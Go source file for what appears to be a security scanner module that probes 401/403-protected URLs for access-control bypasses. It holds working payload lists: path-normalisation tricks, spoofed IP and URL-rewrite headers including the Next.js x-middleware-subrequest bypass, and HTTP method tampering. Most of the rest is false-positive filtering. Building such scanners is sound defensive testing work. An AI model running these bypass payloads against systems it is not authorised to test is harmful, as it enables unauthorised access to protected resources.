package forbidden_bypass

import (
	"strings"

	"github.com/pkg/errors"
	stringsutil "github.com/projectdiscovery/utils/strings"
	urlutil "github.com/projectdiscovery/utils/url"
	"github.com/vigolium/vigolium/pkg/core/hosterrors"
	"github.com/vigolium/vigolium/pkg/dedup"
	"github.com/vigolium/vigolium/pkg/http"
	"github.com/vigolium/vigolium/pkg/httpmsg"
	"github.com/vigolium/vigolium/pkg/modules/infra"
	"github.com/vigolium/vigolium/pkg/modules/modkit"
	"github.com/vigolium/vigolium/pkg/output"
)

type Module struct {
	modkit.BaseActiveModule
	ds                dedup.Lazy[dedup.DiskSet]
	limitCheckPerHost int
}

func New() *Module {
	m := &Module{
		BaseActiveModule: modkit.NewBaseActiveModule(
			ModuleID,
			ModuleName,
			ModuleDesc,
			ModuleShort,
			ModuleConfirmation,
			ModuleSeverity,
			ModuleConfidence,
			modkit.ScanScopeRequest,
			modkit.AllInsertionPointTypes,
		),
		ds:                dedup.LazyDiskSet("forbidden_bypass"),
		limitCheckPerHost: 20,
	}
	m.ModuleTags = ModuleTags
	return m
}

func (m *Module) ScanPerRequest(
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	urlx, err := ctx.URL()
	if err != nil {
		return nil, errors.Wrap(err, "failed to get URL")
	}

	if !infra.IsValidForInjectionVulns(urlx, ctx) {
		return results, nil
	}

	statusCode := 0
	if ctx.Response() != nil {
		statusCode = ctx.Response().StatusCode()
	}
	if statusCode != 401 && statusCode != 403 {
		return results, nil
	}
	if !m.markAndShouldContinue(urlx, scanCtx) {
		return results, nil
	}

	pathBypassResults, err := bypassPath(urlx, ctx, httpClient, scanCtx)
	if err == nil && len(pathBypassResults) > 0 {
		results = append(results, pathBypassResults...)
		return results, nil
	}

	headerBypassResults, err := bypassHeaders(urlx, ctx, httpClient, scanCtx)
	if err == nil && len(headerBypassResults) > 0 {
		results = append(results, headerBypassResults...)
		return results, nil
	}

	methodBypassResults, err := bypassMethod(urlx, ctx, httpClient, scanCtx)
	if err == nil && len(methodBypassResults) > 0 {
		results = append(results, methodBypassResults...)
		return results, nil
	}

	return results, nil
}

func bypassPath(urlx *urlutil.URL, ctx *httpmsg.HttpRequestResponse, httpClient *http.Requester, scanCtx *modkit.ScanContext) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent
	path := urlx.EscapedPath()
	pathPayloads := []string{
		"/." + path,
		path + "/./",
		"/." + path + "/./",
		path + " /",
		"/ " + path + " /",
		path + "	/",
		"/	" + path + "	/",
		path + "..;/",
		path + "?",
		path + "??",
		"/" + path + "//",
		path + "/",
		path + "/.testus",
		path + "../app.py",
		// Path normalization bypasses
		"//" + path,
		"/%2e" + path,
		path + "%00",
		path + ";",
		"/%2f" + path,
		path + "/%2e%2e/",
		"/." + path + "%20",
		strings.ToUpper(path),
		`\` + path,
		path + `%09`,
	}

	for _, payload := range pathPayloads {
		modifiedRaw, err := httpmsg.SetPath(ctx.Request().Raw(), payload)
		if err != nil {
			continue
		}

		fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}
		if resp.Response().StatusCode == 200 {
			// A 200 alone is not a bypass: a server that answers every path with a
			// 200 catch-all/SPA shell would make every mutated payload "succeed". Only
			// report when the 200 body is distinguishable from the host's wildcard
			// response to a random path (fails open on probe error).
			body := resp.Body().String()
			location := resp.Response().Header.Get("Location")
			if !modkit.ConfirmNotSoft404(scanCtx, httpClient, ctx, 200, []byte(body), location) {
				resp.Close()
				continue
			}
			// Reproducibility gate: a transient 200 is not a bypass.
			if !confirmStableBypass(httpClient, ctx.Service(), modifiedRaw, 200, body) {
				resp.Close()
				continue
			}
			// Empty/blank-body catch-all guard: if a clean, unprivileged request to
			// an unrelated random path answers with the same shell (e.g. an empty
			// 200), the host catch-alls every URL and no path payload here is a real
			// bypass. ConfirmNotSoft404's WildcardProbe misses this because it only
			// fires on a NON-EMPTY wildcard body.
			if !confirmDistinctFromCatchAll(httpClient, ctx.Service(), ctx.Request().Raw(), 200, body) {
				resp.Close()
				return results, nil
			}
			respDump := resp.FullResponseString()
			results = append(results, &output.ResultEvent{
				URL:              urlx.Scheme + "://" + urlx.Host + payload,
				Request:          string(modifiedRaw),
				Response:         respDump,
				FuzzingParameter: "path",
				ExtractedResults: []string{payload},
				Info: output.Info{
					Description: "Found 403 Forbidden Bypass using path",
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	return results, nil
}

func bypassHeaders(
	urlx *urlutil.URL,
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	path := urlx.EscapedPath()
	headerPayloads := map[string]string{
		"x-rewrite-url":             path,
		"x-original-url":            path,
		"referer":                   path,
		"x-custom-ip-authorization": "127.0.0.1",
		"x-originating-ip":          "127.0.0.1",
		"x-forwarded-for":           "127.0.0.1",
		"x-remote-ip":               "127.0.0.1",
		"x-client-ip":               "127.0.0.1",
		"x-host":                    "127.0.0.1",
		"x-forwarded-host":          "127.0.0.1",
		// Next.js middleware bypass (CVE-2025-29927)
		"x-middleware-subrequest": "middleware:middleware:middleware:middleware:middleware",
		"x-real-ip":               "127.0.0.1",
		"cf-connecting-ip":        "127.0.0.1",
	}

	for headerKey, headerValue := range headerPayloads {
		var newPath string
		if stringsutil.ContainsAny(headerKey, "x-rewrite-url", "referer") {
			newPath = "/anything"
		} else if strings.Contains(headerKey, "x-original-url") {
			newPath = "/"
		} else {
			newPath = path
		}

		// First set the path, then add the header
		modifiedRaw, err := httpmsg.SetPath(ctx.Request().Raw(), newPath)
		if err != nil {
			continue
		}
		modifiedRaw, err = httpmsg.AddHeader(modifiedRaw, headerKey, headerValue)
		if err != nil {
			continue
		}

		fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}
		if resp.Response().StatusCode == 200 {
			// Same wildcard/catch-all guard as the path bypass: a 200 that merely
			// matches the host's random-path shell is not a genuine bypass.
			body := resp.Body().String()
			location := resp.Response().Header.Get("Location")
			if !modkit.ConfirmNotSoft404(scanCtx, httpClient, ctx, 200, []byte(body), location) {
				resp.Close()
				continue
			}
			// Reproducibility gate: a transient 200 is not a bypass.
			if !confirmStableBypass(httpClient, ctx.Service(), modifiedRaw, 200, body) {
				resp.Close()
				continue
			}
			// Empty/blank-body catch-all guard (see bypassPath). Probe a CLEAN
			// original request (no bypass header) at a random path: if it returns the
			// same shell, the special header isn't granting access — the host just
			// answers everything alike. Using the clean original (not modifiedRaw)
			// avoids a false negative on path-rewriting headers (x-original-url etc.),
			// whose server-honored path would otherwise echo the protected resource.
			if !confirmDistinctFromCatchAll(httpClient, ctx.Service(), ctx.Request().Raw(), 200, body) {
				resp.Close()
				return results, nil
			}
			respDump := resp.FullResponseString()
			results = append(results, &output.ResultEvent{
				URL:              urlx.Scheme + "://" + urlx.Host + newPath,
				Request:          string(modifiedRaw),
				Response:         respDump,
				FuzzingParameter: headerKey,
				ExtractedResults: []string{headerValue},
				Info: output.Info{
					Description: "Found 403 Forbidden Bypass using header",
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	return results, nil
}

// bypassMethods are HTTP methods to test for method tampering bypass.
var bypassMethods = []string{"PUT", "PATCH", "DELETE", "TRACE", "PROPFIND", "CONNECT"}

// methodOverrideHeaders are headers that can override the HTTP method at the server level.
var methodOverrideHeaders = []string{
	"X-HTTP-Method-Override",
	"X-HTTP-Method",
	"X-Method-Override",
}

func bypassMethod(
	urlx *urlutil.URL,
	ctx *httpmsg.HttpRequestResponse,
	httpClient *http.Requester,
	scanCtx *modkit.ScanContext,
) ([]*output.ResultEvent, error) {
	var results []*output.ResultEvent

	// Phase 1: Try different HTTP methods directly
	for _, method := range bypassMethods {
		modifiedRaw, err := httpmsg.SetMethod(ctx.Request().Raw(), method)
		if err != nil {
			continue
		}

		fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		if resp.Response() != nil && isMethodBypassStatus(method, resp.Response().StatusCode, resp.FullResponseString()) {
			// A catch-all host that 2xx-es every request would make every method a
			// "bypass"; require the response to be distinguishable from the host's
			// wildcard shell.
			body := resp.Body().String()
			location := resp.Response().Header.Get("Location")
			if !modkit.ConfirmNotSoft404(scanCtx, httpClient, ctx, resp.Response().StatusCode, []byte(body), location) {
				resp.Close()
				continue
			}
			// Reproducibility gate: a transient 2xx for the method is not a bypass.
			if !confirmStableBypass(httpClient, ctx.Service(), modifiedRaw, resp.Response().StatusCode, body) {
				resp.Close()
				continue
			}
			// Empty/blank-body catch-all guard (see bypassPath). Probe the SAME
			// method at a random path (modifiedRaw already carries the mutated method
			// with the original, space-free path) so a per-method catch-all is caught:
			// if METHOD /random returns the same shell as METHOD /resource, the method
			// isn't bypassing anything.
			if !confirmDistinctFromCatchAll(httpClient, ctx.Service(), modifiedRaw, resp.Response().StatusCode, body) {
				resp.Close()
				return results, nil
			}
			respDump := resp.FullResponseString()
			results = append(results, &output.ResultEvent{
				URL:              urlx.String(),
				Request:          string(modifiedRaw),
				Response:         respDump,
				FuzzingParameter: "method",
				ExtractedResults: []string{method},
				Info: output.Info{
					Description: "Found 403/401 Bypass using HTTP method " + method,
				},
			})
			resp.Close()
			return results, nil
		}
		resp.Close()
	}

	// Phase 2: Try method override headers with POST
	for _, overrideHeader := range methodOverrideHeaders {
		modifiedRaw, err := httpmsg.SetMethod(ctx.Request().Raw(), "POST")
		if err != nil {
			continue
		}
		modifiedRaw, err = httpmsg.AddOrReplaceHeader(modifiedRaw, overrideHeader, "GET")
		if err != nil {
			continue
		}

		fuzzedReq, err := httpmsg.ParseRawRequest(string(modifiedRaw))
		if err != nil {
			continue
		}
		fuzzedReq = fuzzedReq.WithService(ctx.Service())

		resp, _, err := httpClient.Execute(fuzzedReq, http.Options{NoRedirects: true})
		if err != nil {
			if errors.Is(err, hosterrors.ErrUnresponsiveHost) {
				return results, nil
			}
			continue
		}

		if resp.Response() != nil && resp.Response().StatusCode == 200 {
			body := resp.FullResponseString()
			respBody := resp.Body().String()
			location := resp.Response().Header.Get("Location")
			if !strings.Contains(strings.ToLower(body), "method not allowed") &&
				modkit.ConfirmNotSoft404(scanCtx, httpClient, ctx, 200, []byte(respBody), location) &&
				confirmStableBypass(httpClient, ctx.Service(), modifiedRaw, 200, respBody) &&
				// Empty/blank-body catch-all guard (see bypassPath): the override
				// must yield content distinct from the host's response to an
				// unrelated random path, or it's just the catch-all shell.
				confirmDistinctFromCatchAll(httpClient, ctx.Service(), modifiedRaw, 200, respBody) {
				results = append(results, &output.ResultEvent{
					URL:              urlx.String(),
					Request:          string(modifiedRaw),
					Response:         body,
					FuzzingParameter: overrideHeader,
					ExtractedResults: []string{"POST with " + overrideHeader + ": GET"},
					Info: output.Info{
						Description: "Found 403/401 Bypass using method override header " + overrideHeader,
					},
				})
				resp.Close()
				return results, nil
			}
		}
		resp.Close()
	}

	return results, nil
}

// isMethodBypassStatus checks whether the response indicates a genuine method bypass.
// Filters out common false positives.
func isMethodBypassStatus(method string, statusCode int, body string) bool {
	// 405, 401, 403, 404 are not bypasses
	switch statusCode {
	case 405, 401, 403, 404:
		return false
	}

	// Only consider 2xx as potential bypasses
	if statusCode < 200 || statusCode >= 300 {
		return false
	}

	bodyLower := strings.ToLower(body)

	// HEAD returning 200 is normal behavior, not a bypass
	if method == "HEAD" {
		return false
	}

	// OPTIONS with small body is likely CORS preflight, not a bypass
	if method == "OPTIONS" && len(body) < 500 {
		return false
	}

	// Redirect to login page is not a bypass
	if strings.Contains(bodyLower, "/login") || strings.Contains(bodyLower, "/signin") {
		return false
	}

	// "Method not allowed" in body is not a bypass
	if strings.Contains(bodyLower, "method not allowed") {
		return false
	}

	return true
}

// confirmStableBypass re-issues the same mutated request once more and reports
// whether the bypass reproduces: the re-fetch must return the SAME status and a
// body that is textually stable (QuickRatio >= UpperRatioBound) versus the first
// hit. A one-shot 200 from a load-balancer flap, a race, or a caching edge will
// not reproduce and is dropped. It fails OPEN (returns true) only on an
// inconclusive transient error (parse/network failure on the confirm fetch) so a
// real bypass is never suppressed by a flaky second request.
func confirmStableBypass(
	httpClient *http.Requester,
	service *httpmsg.Service,
	modifiedRaw []byte,
	wantStatus int,
	firstBody string,
) bool {
	status, body, ok := modkit.ExecuteRaw(httpClient, service, modifiedRaw, http.Options{NoRedirects: true, NoClustering: true})
	if !ok {
		return true // inconclusive transient error — don't suppress
	}
	if status != wantStatus {
		return false // bypass did not reproduce → drop
	}
	return modkit.BodiesSimilar(firstBody, body)
}

// confirmDistinctFromCatchAll reports whether a candidate bypass response is
// genuinely tied to the targeted resource rather than the host answering every
// URL alike. It re-issues baseRaw — the bypass request's clean template (same
// method, minus any path-rewriting bypass header) — against a fresh random,
// definitely-nonexistent path: if that unprivileged control returns the SAME
// status AND a body indistinguishable from the bypass response, the host is a
// catch-all / wildcard handler (e.g. a Google-fronted edge that returns an empty
// 200 for every path) and the "bypass" is meaningless, so it returns false (drop).
//
// It complements modkit.ConfirmNotSoft404, whose WildcardProbe only fires on a
// NON-EMPTY wildcard body (WildcardEntry.IsWildcard requires BodyLen > 0 and
// MatchesBody bails on an empty body), so an empty-body catch-all slips straight
// through it — the exact shape behind the bsr.netflix.net forbidden-bypass false
// positives, where every mutated payload AND a clean random path return a blank
// 200. Here modkit.BodiesSimilar treats two empty bodies as identical, closing
// that gap.
//
// It fails OPEN (returns true) on a parse/transport error so a transient failure
// never suppresses a real bypass.
func confirmDistinctFromCatchAll(
	httpClient *http.Requester,
	service *httpmsg.Service,
	baseRaw []byte,
	bypassStatus int,
	bypassBody string,
) bool {
	controlRaw, err := httpmsg.SetPath(baseRaw, "/"+modkit.FreshCanary()+"-vgo404")
	if err != nil {
		return true // inconclusive — don't suppress
	}
	status, body, ok := modkit.ExecuteRaw(httpClient, service, controlRaw, http.Options{NoRedirects: true, NoClustering: true})
	if !ok {
		return true // inconclusive transient error — don't suppress
	}
	if status != bypassStatus {
		return true // an unrelated path answers differently → response is resource-specific, keep
	}
	if modkit.BodiesSimilar(bypassBody, body) {
		return false // same shell for an unprivileged random path → catch-all, drop
	}
	return true
}

// markAndShouldContinue marks the host as checked and returns true if it should continue
func (m *Module) markAndShouldContinue(urlx *urlutil.URL, scanCtx *modkit.ScanContext) bool {
	diskSet := m.ds.Get(scanCtx.DedupMgr())
	if diskSet == nil {
		return true
	}
	host := urlx.Hostname()
	_, shouldContinue := diskSet.IncrementAndCheck(host, m.limitCheckPerHost)
	return shouldContinue
}
